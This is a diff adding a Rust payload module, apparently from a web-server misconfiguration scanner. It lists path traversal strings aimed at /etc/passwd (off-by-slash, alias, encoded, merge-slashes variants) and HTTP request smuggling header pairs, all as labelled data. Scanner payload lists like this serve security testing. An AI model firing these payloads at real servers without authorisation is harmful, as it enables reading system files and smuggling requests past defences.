@@ -1,0 +1,127 @@
+use super::TargetPayload;
+
+pub fn get_payloads() -> Vec<TargetPayload> {
+    let mut payloads = Vec::new();
+
+    payloads.extend(get_off_by_slash_payloads());
+    payloads.extend(get_alias_traversal_payloads());
+    payloads.extend(get_merge_slashes_payloads());
+    payloads.extend(get_chunked_encoding_payloads());
+
+    payloads
+}
+
+fn get_off_by_slash_payloads() -> Vec<TargetPayload> {
+    vec![
+        TargetPayload {
+            payload: "/../".to_string(),
+            description: "Off-by-slash: missing slash after location prefix".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+        TargetPayload {
+            payload: "/..../".to_string(),
+            description: "Off-by-slash variant with extra dots".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+        TargetPayload {
+            payload: "/static../".to_string(),
+            description: "Off-by-slash with static prefix".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+        TargetPayload {
+            payload: "/static..".to_string(),
+            description: "Trailing double dots".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+        TargetPayload {
+            payload: "/static../etc/passwd".to_string(),
+            description: "Off-by-slash to passwd".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+        TargetPayload {
+            payload: "/static..%2f..%2f..%2fetc/passwd".to_string(),
+            description: "Off-by-slash encoded traversal".to_string(),
+            category: "off-by-slash".to_string(),
+        },
+    ]
+}
+
+fn get_alias_traversal_payloads() -> Vec<TargetPayload> {
+    vec![
+        TargetPayload {
+            payload: "/images../".to_string(),
+            description: "Alias path traversal".to_string(),
+            category: "alias-traversal".to_string(),
+        },
+        TargetPayload {
+            payload: "/img../etc/passwd".to_string(),
+            description: "Alias traversal to passwd".to_string(),
+            category: "alias-traversal".to_string(),
+        },
+        TargetPayload {
+            payload: "/files..%2f..%2f..%2fetc/passwd".to_string(),
+            description: "Encoded alias traversal".to_string(),
+            category: "alias-traversal".to_string(),
+        },
+        TargetPayload {
+            payload: "/static/..;/".to_string(),
+            description: "Semicolon bypass".to_string(),
+            category: "alias-traversal".to_string(),
+        },
+        TargetPayload {
+            payload: "/static/%2e%2e/".to_string(),
+            description: "URL encoded dots".to_string(),
+            category: "alias-traversal".to_string(),
+        },
+    ]
+}
+
+fn get_merge_slashes_payloads() -> Vec<TargetPayload> {
+    vec![
+        TargetPayload {
+            payload: "//etc/passwd".to_string(),
+            description: "Double slash to passwd".to_string(),
+            category: "merge-slashes".to_string(),
+        },
+        TargetPayload {
+            payload: "///etc/passwd".to_string(),
+            description: "Triple slash".to_string(),
+            category: "merge-slashes".to_string(),
+        },
+        TargetPayload {
+            payload: "////etc/passwd".to_string(),
+            description: "Quad slash".to_string(),
+            category: "merge-slashes".to_string(),
+        },
+        TargetPayload {
+            payload: "/static//../etc/passwd".to_string(),
+            description: "Double slash in path".to_string(),
+            category: "merge-slashes".to_string(),
+        },
+    ]
+}
+
+fn get_chunked_encoding_payloads() -> Vec<TargetPayload> {
+    vec![
+        TargetPayload {
+            payload: "Transfer-Encoding: chunked\r\nTransfer-Encoding: x".to_string(),
+            description: "Double TE header smuggling".to_string(),
+            category: "http-smuggling".to_string(),
+        },
+        TargetPayload {
+            payload: "Transfer-Encoding: chunked\r\nContent-Length: 0".to_string(),
+            description: "TE.CL smuggling test".to_string(),
+            category: "http-smuggling".to_string(),
+        },
+        TargetPayload {
+            payload: "Transfer-Encoding: xchunked".to_string(),
+            description: "Invalid TE prefix".to_string(),
+            category: "http-smuggling".to_string(),
+        },
+        TargetPayload {
+            payload: "Transfer-Encoding: x".to_string(),
+            description: "Invalid TE value".to_string(),
+            category: "http-smuggling".to_string(),
+        },
+    ]
+}
